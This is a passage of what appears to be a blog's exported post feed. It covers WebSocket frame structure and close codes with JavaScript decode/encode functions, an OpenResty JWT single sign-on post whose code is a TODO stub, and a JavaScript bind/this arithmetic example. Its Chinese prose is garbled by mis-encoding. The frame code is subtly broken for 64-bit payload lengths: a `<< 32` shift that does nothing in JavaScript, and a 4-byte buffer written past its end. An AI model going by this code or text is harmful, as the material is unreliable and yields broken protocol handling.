é¢„ç•™å­—æ®µï¼Œé»˜è®¤ä¸º0ã€‚</p></li><li><p>Opcode: 4 bits</p><p>  è¡¨ç¤ºæ•°æ®çš„ç±»å‹ã€‚</p><ul><li><p>%x0 denotes a continuation frame</p></li><li><p>%x1 denotes a text frame</p></li><li><p>%x2 denotes a binary frame</p></li><li><p>%x3-7 are reserved for further non-control frames</p></li><li><p>%x8 denotes a connection close</p></li><li><p>%x9 denotes a ping</p></li><li><p>%xA denotes a pong</p></li><li><p>%xB-F are reserved for further control frames</p></li></ul></li><li><p>Mask: 1 bit</p><p>  1ä½ã€‚</p><p>  æ ‡è¯†è¿™ä¸ªæ•°æ®å¸§çš„æ•°æ®æ˜¯å¦ä½¿ç”¨æ©ç ï¼Œå€¼ä¸º1è¡¨ç¤ºä½¿ç”¨æ©ç ã€‚ä»å®¢æˆ·ç«¯å‘é€çš„æ•°æ®éƒ½ä¸º1ã€‚</p></li><li><p>Payload length: 7 bits, 7+16 bits, or 7+64 bits</p><p>  7ä½ã€‚è¡¨ç¤ºæ•°æ®çš„é•¿åº¦ã€‚</p><p>  PayloadLengthåªæœ‰7ä½ï¼Œæ¢æˆæ— ç¬¦å·æ•´å‹çš„è¯åªæœ‰0åˆ°127çš„å–å€¼ï¼Œè¿™ä¹ˆå°çš„æ•°å€¼å½“ç„¶æ— æ³•æè¿°è¾ƒå¤§çš„æ•°æ®ï¼Œå› æ­¤è§„å®šå½“æ•°æ®é•¿åº¦å°äºæˆ–ç­‰äº125æ—¶å€™å®ƒæ‰ä½œä¸ºæ•°æ®é•¿åº¦çš„æè¿°ï¼Œå¦‚æœè¿™ä¸ªå€¼ä¸º126ï¼Œåˆ™æ—¶å€™åé¢çš„ä¸¤ä¸ªå­—èŠ‚ï¼ˆ16ä½ï¼‰æ¥å‚¨å­˜å‚¨å­˜æ•°æ®é•¿åº¦ï¼Œå¦‚æœä¸º127åˆ™ç”¨åé¢å…«ä¸ªå­—èŠ‚ï¼ˆ64ä½ï¼Œæœ€é«˜æœ‰æ•ˆä½å¿…é¡»æ˜¯0ï¼‰æ¥å‚¨å­˜æ•°æ®é•¿åº¦ã€‚</p></li><li><p>Masking-key: 0 or 4 bytes</p><p>  <code>Mask</code>çš„å€¼ä¸º<code>1</code>æ—¶æ‰æœ‰<code>Masking-key</code>ã€‚</p></li><li><p>Payload </p><p>  å¦‚æœä½¿ç”¨äº†æ©ç æ‰€æœ‰æ•°æ®å°±éœ€è¦å’Œæ©ç åšå¼‚æˆ–ï¼ˆ^ï¼‰è¿ç®—ã€‚</p>  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">j                   = i MOD 4</span><br><span class="line">transformed-octet-i = original-octet-i XOR masking-key-octet-j</span><br></pre></td></tr></table></figure>  <figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>, ret = []; i &lt; payload.<span class="property">length</span>; i++) ret.<span class="title function_">push</span>(payload[i] ^ <span class="title class_">MaskingKey</span>[i % <span class="number">4</span>]);</span><br></pre></td></tr></table></figure></li></ul><p>ç¤ºä¾‹ï¼š</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> ws = <span class="keyword">new</span> <span class="title class_">WebSocket</span>(<span class="string">&#x27;ws://example.com/&#x27;</span>);</span><br><span class="line">ws.<span class="title function_">send</span>(<span class="string">&#x27;ok&#x27;</span>);</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">bits: 1000 0001 1 0000010 00101011-01101000-10101000-11100111 0100010000000011</span><br><span class="line"></span><br><span class="line">FIN                1 </span><br><span class="line">Opcode             0001</span><br><span class="line">Mask               1</span><br><span class="line">PayloadLength      0000010</span><br><span class="line">Masking-key        00101011-01101000-10101000-11100111</span><br><span class="line">Payload            0100010000000011</span><br></pre></td></tr></table></figure><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">decodeWebSocketFrame</span>(<span class="params">msg</span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> pos = <span class="number">0</span>;</span><br><span class="line">    <span class="comment">// è¯»å–å‰16ä½ï¼ˆå¸§å¤´ï¼‰</span></span><br><span class="line">    <span class="keyword">let</span> header = msg.<span class="title function_">readUInt16BE</span>(pos);</span><br><span class="line">    pos += <span class="number">2</span>;</span><br><span class="line">    <span class="comment">// è½¬ä¸ºäºŒè¿›åˆ¶</span></span><br><span class="line">    <span class="comment">// let headerBits = header.toString(2).padStart(16, &#x27;0&#x27;);</span></span><br><span class="line">    <span class="comment">// let fin = headerBits.slice(0, 1);</span></span><br><span class="line">    <span class="comment">// let opcode = headerBits.slice(4, 8);</span></span><br><span class="line">    <span class="comment">// let mask = headerBits.slice(8, 9);</span></span><br><span class="line">    <span class="comment">// let payloadLength = parseInt(headerBits.slice(9, 16), 2);</span></span><br><span class="line">    <span class="keyword">let</span> fin = header &gt;&gt; <span class="number">15</span>;</span><br><span class="line">    <span class="keyword">let</span> opcode = (header &amp; <span class="number">0b0000111100000000</span>) &gt;&gt; <span class="number">8</span>;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>((header &amp; <span class="number">0b0000000010000000</span>).<span class="title function_">toString</span>(<span class="number">2</span>));</span><br><span class="line">    <span class="keyword">let</span> mask = (header &amp; <span class="number">0b0000000010000000</span>) &gt;&gt; <span class="number">7</span>;</span><br><span class="line">    <span class="keyword">let</span> payloadLength = header &amp; <span class="number">0b0000000001111111</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 127</span></span><br><span class="line">    <span class="keyword">if</span> (payloadLength === <span class="number">127</span>) &#123;</span><br><span class="line">        <span class="comment">// æœ€é«˜æœ‰æ•ˆä½å¿…é¡»ä¸º0</span></span><br><span class="line">        <span class="comment">// å¤´32ä½è¡¥é›¶åˆ°64ä½åŠ å32ä½</span></span><br><span class="line">        <span class="comment">// let first32 = msg.readUInt32BE(pos) &amp; 0b01111111111111111111111111111111 &lt;&lt; 32;</span></span><br><span class="line">        <span class="keyword">let</span> first32 = msg.<span class="title function_">readUInt32BE</span>(pos) &lt;&lt; <span class="number">32</span>;</span><br><span class="line">        pos += <span class="number">4</span>;</span><br><span class="line">        <span class="keyword">let</span> second32 = msg.<span class="title function_">readUInt32BE</span>(pos);</span><br><span class="line">        pos += <span class="number">4</span>;</span><br><span class="line">        payloadLength = first32 + second32;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (payloadLength === <span class="number">126</span>) &#123;</span><br><span class="line">        payloadLength = msg.<span class="title function_">readUInt16BE</span>(pos);</span><br><span class="line">        pos += <span class="number">2</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">let</span> maskingKey = [];</span><br><span class="line">    <span class="keyword">if</span> (mask === <span class="number">1</span>) &#123;</span><br><span class="line">        <span class="comment">// 4ä½æ©ç </span></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; <span class="number">4</span>; i++) &#123;</span><br><span class="line">            maskingKey.<span class="title function_">push</span>(msg.<span class="title function_">readUInt8</span>(pos++));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">let</span> payload = msg.<span class="title function_">slice</span>(pos, pos + payloadLength);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; payloadLength; i++) &#123;</span><br><span class="line">        payload[i] = payload[i] ^ maskingKey[i % <span class="number">4</span>];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// fin = 1 è¡¨ç¤ºç»“æŸ</span></span><br><span class="line">    <span class="keyword">if</span> (fin === <span class="number">1</span> &amp;&amp; opcode == <span class="number">0x1</span>) payload = payload.<span class="title function_">toString</span>();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> &#123;</span><br><span class="line">        fin,</span><br><span class="line">        opcode,</span><br><span class="line">        mask,</span><br><span class="line">        payloadLength,</span><br><span class="line">        maskingKey,</span><br><span class="line">        payload</span><br><span class="line">    &#125;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="ç”Ÿæˆæ•°æ®å¸§"><a href="#ç”Ÿæˆæ•°æ®å¸§" class="headerlink" title="ç”Ÿæˆæ•°æ®å¸§"></a>ç”Ÿæˆæ•°æ®å¸§</h4><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">encodeWebSocketFrame</span>(<span class="params">frame</span>) &#123;</span><br><span class="line">    <span class="keyword">let</span> data = [];</span><br><span class="line">    <span class="keyword">let</span> mask = <span class="number">0</span>; <span class="comment">// ä¸åšæ©ç </span></span><br><span class="line">    <span class="keyword">let</span> payload = <span class="title class_">Buffer</span>.<span class="title function_">from</span>(frame.<span class="property">payloadData</span>);</span><br><span class="line">    <span class="comment">// 16bits 2bytes</span></span><br><span class="line">    <span class="keyword">let</span> headerBuf = <span class="title class_">Buffer</span>.<span class="title function_">alloc</span>(<span class="number">2</span>);</span><br><span class="line">    data.<span class="title function_">push</span>(headerBuf);</span><br><span class="line"></span><br><span class="line">    headerBuf.<span class="title function_">writeUInt8</span>(frame.<span class="property">fin</span> &lt;&lt; <span class="number">7</span> | frame.<span class="property">opcode</span>);</span><br><span class="line">    <span class="keyword">if</span> (payload.<span class="property">length</span> &gt; <span class="number">0xFFFF</span>) &#123;</span><br><span class="line">        headerBuf.<span class="title function_">writeUInt8</span>(mask &lt;&lt; <span class="number">7</span> | <span class="number">127</span>, <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">let</span> extendedPayloadLengthBuf = <span class="title class_">Buffer</span>.<span class="title function_">alloc</span>(<span class="number">4</span>);</span><br><span class="line">        data.<span class="title function_">push</span>(extendedPayloadLengthBuf);</span><br><span class="line">        <span class="comment">// å¤´32ä½</span></span><br><span class="line">        extendedPayloadLengthBuf.<span class="title function_">writeUInt32BE</span>(payload.<span class="property">length</span> &gt;&gt; <span class="number">32</span>);</span><br><span class="line">        <span class="comment">// å32ä½</span></span><br><span class="line">        extendedPayloadLengthBuf.<span class="title function_">writeUInt32BE</span>(payload.<span class="property">length</span> &amp; <span class="number">0xFFFFFFFF</span>, <span class="number">2</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (payload.<span class="property">length</span> &gt; <span class="number">125</span>) &#123;</span><br><span class="line">        headerBuf.<span class="title function_">writeUInt8</span>(mask &lt;&lt; <span class="number">7</span> | <span class="number">126</span>, <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">let</span> extendedPayloadLengthBuf = <span class="title class_">Buffer</span>.<span class="title function_">alloc</span>(<span class="number">2</span>);</span><br><span class="line">        data.<span class="title function_">push</span>(extendedPayloadLengthBuf);</span><br><span class="line">        extendedPayloadLengthBuf.<span class="title function_">writeUInt16BE</span>(payload.<span class="property">length</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        headerBuf.<span class="title function_">writeUInt8</span>(mask &lt;&lt; <span class="number">7</span> | payload.<span class="property">length</span>, <span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    data.<span class="title function_">push</span>(payload);</span><br><span class="line">    <span class="keyword">return</span> <span class="title class_">Buffer</span>.<span class="title function_">concat</span>(data);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="å…³é—­è¿æ¥"><a href="#å…³é—­è¿æ¥" class="headerlink" title="å…³é—­è¿æ¥"></a>å…³é—­è¿æ¥</h4><p>WebSocketè¿æ¥å…³é—­æ—¶éœ€è¦ä¸¤è€…åå•†ã€‚å®¢æˆ·ç«¯è°ƒç”¨<code>close</code>æ–¹æ³•ä¼šç»™æœåŠ¡å™¨ç«¯å…ˆå‘é€ä¸€ä¸ªæ•°æ®å¸§ï¼Œè¯¥æ•°æ®å¸§<code>opcode</code>ä¸º<code>0x8</code>ã€‚å¦‚æœ<code>payload</code>ä¸ä¸ºç©ºï¼Œå®ƒçš„<code>payload</code>å¤´ä¸¤ä¸ªå­—èŠ‚ä¸ºçŠ¶æ€ç ï¼Œåé¢çš„æ˜¯å…³é—­è¿æ¥çš„åŸå› ã€‚æœåŠ¡å™¨æ–­å¼€è¿æ¥åæ‰ä¼šè§¦å‘<code>close</code>äº‹ä»¶ã€‚</p><ul><li><p>1000</p><p>  1000è¡¨ç¤ºæ­£å¸¸å…³é—­ï¼Œæ„æ€æ˜¯å»ºè®®çš„è¿æ¥å·²ç»å®Œæˆäº†ã€‚</p></li><li><p>1001</p><p>  1001è¡¨ç¤ºç«¯ç‚¹â€œç¦»å¼€â€ï¼ˆgoing awayï¼‰ï¼Œä¾‹å¦‚æœåŠ¡å™¨å…³é—­æˆ–æµè§ˆå™¨å¯¼èˆªåˆ°å…¶ä»–é¡µé¢ã€‚</p></li><li><p>1002</p><p>  1002è¡¨ç¤ºç«¯ç‚¹å› ä¸ºåè®®é”™è¯¯è€Œç»ˆæ­¢è¿æ¥ã€‚</p></li><li><p>1003</p><p>  1003è¡¨ç¤ºç«¯ç‚¹ç”±äºå®ƒæ”¶åˆ°äº†ä¸èƒ½æ¥æ”¶çš„æ•°æ®ç±»å‹ï¼ˆä¾‹å¦‚ï¼Œç«¯ç‚¹ä»…ç†è§£æ–‡æœ¬æ•°æ®ï¼Œä½†æ¥æ”¶åˆ°äº†äºŒè¿›åˆ¶æ¶ˆæ¯ï¼‰è€Œç»ˆæ­¢è¿æ¥ã€‚</p></li><li><p>1004 ä¿ç•™ã€‚å¯èƒ½åœ¨å°†æ¥å®šä¹‰å…¶å…·ä½“çš„å«ä¹‰ã€‚</p></li><li><p>1005</p><p>  1005æ˜¯ä¸€ä¸ªä¿ç•™å€¼ï¼Œä¸”ä¸èƒ½ç”±ç«¯ç‚¹åœ¨å…³é—­æ§åˆ¶å¸§ä¸­è®¾ç½®æ­¤çŠ¶æ€ç ã€‚å®ƒè¢«æŒ‡å®šç”¨åœ¨æœŸå¾…ä¸€ä¸ªç”¨äºè¡¨ç¤ºæ²¡æœ‰çŠ¶æ€ç æ˜¯å®é™…å­˜åœ¨çš„çŠ¶æ€ç çš„åº”ç”¨ä¸­ã€‚</p></li><li><p>1006</p><p>  1006æ˜¯ä¸€ä¸ªä¿ç•™å€¼ï¼Œä¸”ä¸èƒ½ç”±ç«¯ç‚¹åœ¨å…³é—­æ§åˆ¶å¸§ä¸­è®¾ç½®æ­¤çŠ¶æ€ç ã€‚å®ƒè¢«æŒ‡å®šç”¨åœ¨æœŸå¾…ä¸€ä¸ªç”¨äºè¡¨ç¤ºè¿æ¥å¼‚å¸¸å…³é—­çš„çŠ¶æ€ç çš„åº”ç”¨ä¸­ã€‚</p></li><li><p>1007</p><p>  1007è¡¨ç¤ºç«¯ç‚¹å› ä¸ºæ¶ˆæ¯ä¸­æ¥æ”¶åˆ°çš„æ•°æ®æ˜¯ä¸ç¬¦åˆæ¶ˆæ¯ç±»å‹è€Œç»ˆæ­¢è¿æ¥ï¼ˆæ¯”å¦‚ï¼Œæ–‡æœ¬æ¶ˆæ¯ä¸­å­˜åœ¨éUTF-8[RFC3629]æ•°æ®ï¼‰ã€‚</p></li><li><p>1008</p><p>  1008è¡¨ç¤ºç«¯ç‚¹å› ä¸ºæ¥æ”¶åˆ°çš„æ¶ˆæ¯è¿åå…¶ç­–ç•¥è€Œç»ˆæ­¢è¿æ¥ã€‚è¿™æ˜¯ä¸€ä¸ªå½“æ²¡æœ‰å…¶ä»–åˆé€‚çŠ¶æ€ç ï¼ˆä¾‹å¦‚1003æˆ–1009ï¼‰æˆ–å¦‚æœéœ€è¦éšè—ç­–ç•¥çš„å…·ä½“ç»†èŠ‚æ—¶èƒ½è¢«è¿”å›çš„é€šç”¨çŠ¶æ€ç ã€‚</p></li><li><p>1009</p><p>  1009è¡¨ç¤ºç«¯ç‚¹å› æ¥æ”¶åˆ°çš„æ¶ˆæ¯å¯¹å®ƒçš„å¤„ç†æ¥è¯´å¤ªå¤§è€Œç»ˆæ­¢è¿æ¥ã€‚</p></li><li><p>1010</p><p>  1010è¡¨ç¤ºç«¯ç‚¹ï¼ˆå®¢æˆ·ç«¯ï¼‰å› ä¸ºå®ƒæœŸæœ›æœåŠ¡å™¨åå•†ä¸€ä¸ªæˆ–å¤šä¸ªæ‰©å±•ï¼Œä½†æœåŠ¡å™¨æ²¡æœ‰åœ¨WebSocketæ¡æ‰‹å“åº”æ¶ˆæ¯ä¸­è¿”å›å®ƒä»¬è€Œç»ˆæ­¢è¿æ¥ã€‚ æ‰€éœ€è¦çš„æ‰©å±•åˆ—è¡¨åº”è¯¥å‡ºç°åœ¨å…³é—­å¸§çš„&#x2F;reason&#x2F;éƒ¨åˆ†ã€‚</p><p>  æ³¨æ„ï¼Œè¿™ä¸ªçŠ¶æ€ç ä¸èƒ½è¢«æœåŠ¡å™¨ç«¯ä½¿ç”¨ï¼Œå› ä¸ºå®ƒå¯ä»¥å¤±è´¥WebSocketæ¡æ‰‹ã€‚</p></li><li><p>1011</p><p>  1011è¡¨ç¤ºæœåŠ¡å™¨ç«¯å› ä¸ºé‡åˆ°äº†ä¸€ä¸ªä¸æœŸæœ›çš„æƒ…å†µä½¿å®ƒæ— æ³•æ»¡è¶³è¯·æ±‚è€Œç»ˆæ­¢è¿æ¥ã€‚</p></li><li><p>1015</p><p>  1015æ˜¯ä¸€ä¸ªä¿ç•™å€¼ï¼Œä¸”ä¸èƒ½ç”±ç«¯ç‚¹åœ¨å…³é—­å¸§ä¸­è¢«è®¾ç½®ä¸ºçŠ¶æ€ç ã€‚å®ƒè¢«æŒ‡å®šç”¨åœ¨æœŸå¾…ä¸€ä¸ªç”¨äºè¡¨ç¤ºè¿æ¥ç”±äºæ‰§è¡ŒTLSæ¡æ‰‹å¤±è´¥è€Œå…³é—­çš„çŠ¶æ€ç çš„åº”ç”¨ä¸­ï¼ˆæ¯”å¦‚ï¼ŒæœåŠ¡å™¨è¯ä¹¦ä¸èƒ½éªŒè¯ï¼‰ã€‚</p></li></ul><h4 id="çŠ¶æ€è½¬å˜"><a href="#çŠ¶æ€è½¬å˜" class="headerlink" title="çŠ¶æ€è½¬å˜"></a>çŠ¶æ€è½¬å˜</h4><p>å®¢æˆ·ç«¯å…±æœ‰å››ç§çŠ¶æ€<code>CONNECTING</code>(0)ã€<code>OPEN</code>(1)ã€<code>CLOSEING</code>(2)ã€<code>CLOSED</code>(3)ï¼Œè°ƒç”¨<code>readyState</code>å¯ä»¥æŸ¥çœ‹å…·ä½“çš„çŠ¶æ€ã€‚</p><p>åˆ›å»º<code>WebSocket</code>å¯¹è±¡åå¤„äº<code>CONNECTING</code>çŠ¶æ€ï¼Œå®Œæˆåè®®å‡çº§åå˜ä¸º<code>OPEN</code>çŠ¶æ€ã€‚è°ƒç”¨<code>close()</code>æ–¹æ³•åå¤„äº<code>CLOSEING</code>çŠ¶æ€ï¼Œè¿æ¥æ–­å¼€åå˜ä¸º<code>CLOSED</code>çŠ¶æ€ã€‚</p><p><a href="https://gist.github.com/tianyk/de89f1f70d229861384126c417ab6138">å®Œæ•´æµ‹è¯•ä»£ç </a></p><script src="https://gist.github.com/de89f1f70d229861384126c417ab6138.js"></script><h3 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h3><ul><li><a href="https://imququ.com/post/protocol-negotiation-in-http2.html">è°ˆè°ˆ HTTP&#x2F;2 çš„åè®®åå•†æœºåˆ¶</a></li><li><a href="https://tools.ietf.org/html/rfc6455">The WebSocket Protocol</a></li><li><a href="https://www.web-tinker.com/article/20305.html">WebSocket(å£¹) æ¡æ‰‹è¿æ¥</a></li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> websocket </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ç”¨OpenRestyå®ç°ç»Ÿä¸€ç™»å½•ç³»ç»Ÿ</title>
      <link href="/post/sso.html"/>
      <url>/post/sso.html</url>
      
        <content type="html"><![CDATA[<h2 id="OpenRestyç»Ÿä¸€ç™»å½•ç³»ç»Ÿ"><a href="#OpenRestyç»Ÿä¸€ç™»å½•ç³»ç»Ÿ" class="headerlink" title="OpenRestyç»Ÿä¸€ç™»å½•ç³»ç»Ÿ"></a>OpenRestyç»Ÿä¸€ç™»å½•ç³»ç»Ÿ</h2><p>ä¸€ä¸ªå¤§çš„ç³»ç»Ÿå¾€å¾€ä¼šæœ‰å¤šä¸ªå­ç³»ç»Ÿç»„æˆï¼Œè¦å®ç°ç”¨æˆ·åœ¨å¤šä¸ªç³»ç»Ÿé—´åªæœ‰åˆ‡æ¢ï¼Œæˆ‘ä»¬å¾€å¾€éœ€è¦ä¸€ä¸ªç»Ÿä¸€çš„ç™»å½•æƒé™ç³»ç»Ÿæˆ–è€…ä¸€ä¸ªç»Ÿä¸€çš„è§„åˆ™ã€‚</p><p>å¤§å¤šæ•°ç³»ç»Ÿå‰ç½®éƒ½ä¼šä½¿ç”¨<code>Nginx</code>åšè´Ÿè½½æˆ–è€…åˆ†å‘ï¼Œå¦‚æœæˆ‘ä»¬æŠŠç™»å½•è¿™å—æŠ½å–å‡ºæ¥æ”¾åˆ°<code>Nginx</code>é‡Œé¢ä¸‹å±‚çš„å­ç³»ç»Ÿå°±ä¸éœ€è¦éƒ½å»å¤„ç†è¿™æ–¹é¢çš„é—®é¢˜äº†ã€‚è¿™æ ·æ•´ä¸ªç³»ç»Ÿæ›´åŠ ç»Ÿä¸€æ¸…æ™°ã€å­ç³»ç»Ÿåªéœ€è¦å…³æ³¨è‡ªèº«ä¸šåŠ¡å³å¯ã€‚</p><h3 id="è®¾è®¡åŠå®ç°"><a href="#è®¾è®¡åŠå®ç°" class="headerlink" title="è®¾è®¡åŠå®ç°"></a>è®¾è®¡åŠå®ç°</h3><p><img src="/images/openresty-sso.jpg"></p><p>è¿™é‡Œå¯ä»¥ä½¿ç”¨<a href="https://jwt.io/">JWT</a>æ¥å®ç°<code>TOKEN</code>ï¼Œç™»å½•æˆåŠŸåå°†<code>TOKEN</code>å†™å…¥<code>Cookie</code>ä¸­ã€‚å‘èµ·è¯·æ±‚æ—¶å…ˆä»<code>Cookie</code>ä¸­è·å–<code>TOKEN</code>ç„¶åæ ¡éªŒï¼Œæ ¡éªŒæˆåŠŸåå°†<code>TOKEN</code>è§£æåçš„å†…å®¹è¿½åŠ åˆ°Cookieä¸­å†å‘åé¢çš„ä¸šåŠ¡ç³»ç»Ÿåˆ†å‘ã€‚</p><figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- sso.lua </span></span><br><span class="line"><span class="comment">-- TODO </span></span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> openresty </tag>
            
            <tag> sso </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>JavaScriptæ¨¡æ‹Ÿå››åˆ™è¿ç®—</title>
      <link href="/post/javascript-elementary-arithmetic.html"/>
      <url>/post/javascript-elementary-arithmetic.html</url>
      
        <content type="html"><![CDATA[<p><img src="/images/elementary-arithmetic.jpg"></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">add</span>(<span class="params">num</span>) &#123;</span><br><span class="line">    <span class="comment">// é‡ç‚¹!!!è¿™é‡Œçš„numæ˜¯ä¸€ä¸ªè®¡ç®—åçš„ç»“æœ</span></span><br><span class="line">    <span class="comment">// è¿™é‡Œçš„thisåœ¨è°ƒç”¨å¤„è¿›è¡Œäº†ä¿®æ­£ï¼ŒæŒ‡å‘ A + B ä¸­çš„ Aã€‚</span></span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">this</span>.<span class="property">value</span> + num;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">one</span>(<span class="params">op</span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> _one = &#123; <span class="attr">value</span>: <span class="number">1</span> &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (op) &#123;</span><br><span class="line">        op = op.<span class="title function_">bind</span>(_one);</span><br><span class="line">        <span class="comment">// å…³é”®ç‚¹å°†æœ¬å€¼ç»‘å®šåˆ°æ“ä½œå‡½æ•°ä¸Šï¼Œè®©æ“ä½œå‡½æ•°èƒ½è®¿é—®æœ¬å€¼</span></span><br><span class="line">        <span class="comment">// è¿”å› + - * / æ“ä½œç»“æœ</span></span><br><span class="line">        <span class="keyword">return</span> <span class="title function_">op</span>();</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// è¿”å›æœ¬å€¼</span></span><br><span class="line">        <span class="keyword">return</span> _one.<span class="property">value</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title function_">one</span>(<span class="title function_">add</span>(<span class="title function_">one</span>(<span class="title function_">add</span>(<span class="title function_">one</span>())))));</span><br><span class="line"><span class="comment">// setp_1 </span></span><br><span class="line"><span class="comment">// one();        // 1</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// setp_2        one(add(one())) ç¬¬ä¸€æ­¥ç®—å‡ºone()ä¸º1</span></span><br><span class="line"><span class="comment">// one(add(1)); // 2 addçš„thisä¸ºoneå†…éƒ¨çš„`_one`</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// setp_3        one(add(one(add(one())))) ä¸Šä¸¤æ­¥ç®—å‡ºone(add(one()))ä¸º2</span></span><br><span class="line"><span class="comment">// one(add(2)); // 3 </span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> javascript </tag>
            
            <tag> this </tag>
            
            <tag> bind </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ç½‘ç«™å˜æ›´å†å²</title>
      <link href="/post/history.html"/>
      <url>/post/history.html</url>
      
